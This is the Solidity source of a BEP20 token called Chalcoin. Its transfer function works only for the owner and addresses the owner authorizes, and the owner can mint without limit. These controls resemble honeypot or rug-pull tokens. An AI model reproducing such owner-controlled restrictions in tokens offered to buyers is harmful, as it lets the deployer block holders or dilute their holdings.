// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBEP20 {
function totalSupply() external view returns (uint256);
function balanceOf(address account) external view returns (uint256);
function transfer(address recipient, uint256 amount) external returns (bool);
function allowance(address owner, address spender) external view returns (uint256);
function approve(address spender, uint256 amount) external returns (bool);
function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
event Transfer(address indexed from, address indexed to, uint256 value);
event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Chalcoin is IBEP20 {
string public name = "Chalcoin";
string public symbol = "CHLK";
uint8 public decimals = 18;
uint256 private _totalSupply = 6000 * 10 ** uint256(decimals);
mapping(address => uint256) private _balances;
mapping(address => mapping(address => uint256)) private _allowed;
mapping(address => bool) private _authorizedAddresses;


address private _owner;
constructor() {
    _balances[msg.sender] = _totalSupply;
    _owner = msg.sender;
    emit Transfer(address(0), msg.sender, _totalSupply);
}
function addAuthorizedAddress(address authorizedAddress) public {
        require(msg.sender == _owner, "Only the contract owner can add authorized addresses");
        require(authorizedAddress != address(0), "BEP20: adding the zero address");
        _authorizedAddresses[authorizedAddress] = true;
    }

    function removeAuthorizedAddress(address authorizedAddress) public {
        require(msg.sender == _owner, "Only the contract owner can remove authorized addresses");
        require(authorizedAddress != address(0), "BEP20: removing the zero address");
        _authorizedAddresses[authorizedAddress] = false;
    }
function totalSupply() public view override returns (uint256) {
    return _totalSupply;
}

function balanceOf(address account) public view override returns (uint256) {
    return _balances[account];
}

function transfer(address recipient, uint256 amount) public override returns (bool) {
    require(_authorizedAddresses[msg.sender] || msg.sender == _owner, "BEP20: sender is not authorized");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    require(amount <= _balances[msg.sender], "BEP20: transfer amount exceeds balance");
    _balances[msg.sender] -= amount;
    _balances[recipient] += amount;
    emit Transfer(msg.sender, recipient, amount);
    return true;
}

function allowance(address owner, address spender) public view override returns (uint256) {
    return _allowed[owner][spender];
}

function approve(address spender, uint256 amount) public override returns (bool) {
    _allowed[msg.sender][spender] = amount;
    emit Approval(msg.sender, spender, amount);
    return true;
}

function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    require(amount <= _balances[sender], "BEP20: transfer amount exceeds balance");
    require(amount <= _allowed[sender][msg.sender], "BEP20: transfer amount exceeds allowance");
    _balances[sender] -= amount;
    _balances[recipient] += amount;
    _allowed[sender][msg.sender] -= amount;
    emit Transfer(sender, recipient, amount);
    return true;
}

function mint(uint256 amount) public {
    require(msg.sender == _owner, "Only the contract owner can mint tokens");
    _totalSupply += amount;
    _balances[msg.sender] += amount;
    emit Transfer(address(0), msg.sender, amount);
}

function burn(uint256 amount) public {
    require(amount <= _balances[msg.sender], "BEP20: burn amount exceeds balance");
    _balances[msg.sender] -= amount;
    _totalSupply -= amount;
    emit Transfer(msg.sender, address(0), amount);
    }
}